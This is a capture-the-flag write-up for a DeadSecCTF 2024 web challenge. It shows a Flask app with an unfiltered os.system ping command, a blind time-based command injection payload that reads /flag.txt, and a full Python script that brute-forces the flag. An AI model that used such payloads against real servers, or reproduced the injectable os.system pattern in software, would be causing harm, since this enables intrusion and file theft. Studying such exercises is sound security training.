# Web/Bing_Revenge

## Description

Attachments: [Bing_revenge.zip](./Bing_revenge.zip)

## Challenge Overview

This challenge was similar to the challenge `Web/Bing` that came in DeadSecCTF 2023. 

app.py
```py
#!/usr/bin/env python3
import os
from flask import Flask, request, render_template

app = Flask(__name__)


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/flag', methods=['GET', 'POST'])
def ping():
    if request.method == 'POST':
        host = request.form.get('host')
        cmd = f'{host}'
        if not cmd:
             return render_template('ping_result.html', data='Hello')
        try:
            output = os.system(f'ping -c 4 {cmd}')
            return render_template('ping_result.html', data="DeadSecCTF2024")
        except subprocess.CalledProcessError:
            return render_template('ping_result.html', data=f'error when executing command')
        except subprocess.TimeoutExpired:
            return render_template('ping_result.html', data='Command timed out')

    return render_template('ping.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

In this challenge we are given a simple `Flask` application pings the input ip address that we give at `/flag` using `output = os.system(f'ping -c 4 {cmd}')`. It does not even filter the input we give. 

Thus we can easily send something like `; ls;` and it would execute on the server. The issue here was that the result of the command is not returned to us. Irrespective of the input we give, the server would only return `DeadSecCTF2024` in response.

One way is to get the flag by getting a reverse shell but that was not possible here as the admins had told that these instances do not have any connection to the internet, that is why we won't be able to get a reverse shell back.

Thus, the method we can use is a time based attack.

**Payload:** `; if [ $(cat /flag.txt | cut -c 1) = "D" ]; then sleep 10; fi; `

This is a simple payload. `;` helps us close the `ping` statement and then it runs a conditional statement that checks if the `first` character of the `flag` is `D`. If it is, then the program stop for `10 seconds` (you can have a shorter sleep time but I just used a longer one to be sure I get the correct character). Using this method we can character-wise bruteforce the flag.

## Exploit

exploit.py
```py
import requests
from string import printable
from time import time
from tqdm import tqdm

baseURL = "" # Your instance URL (like https://7c613d88f8c24c61ed3939b2.deadsec.quest)
# baseURL = "http://localhost:5000"

def flag(host):
    url = baseURL + "/flag"
    sendData = {"host": host}
    r = requests.post(url, data=sendData)
    res = r.text

    res = res.split("<pre>")[1]
    res = res.split("</pre>")[0]
    return res

correctFlag = "DEAD{"
wait = 10
for i in range(len(correctFlag)+1, 60+1):
    for letter in tqdm("}" + printable):
        exploit = f'; if [ $(cat /flag.txt | cut -c {i}) = "{letter}" ]; then sleep {wait}; fi; '
        start = time()
        flag(exploit)
        end = time()
        time_taken = end - start
        if (time_taken > wait):
            correctFlag += str(letter)
            break
    print(correctFlag)

print(correctFlag)

```

The script might give a `Connection Error` sometimes because of the server sometimes so you will then have to replace the `correctFlag` with the portion of the flag you have found out till now.

This gives us our flag `DEAD{f93efeba-0d78-4130-9114-783f2cd337e3}`.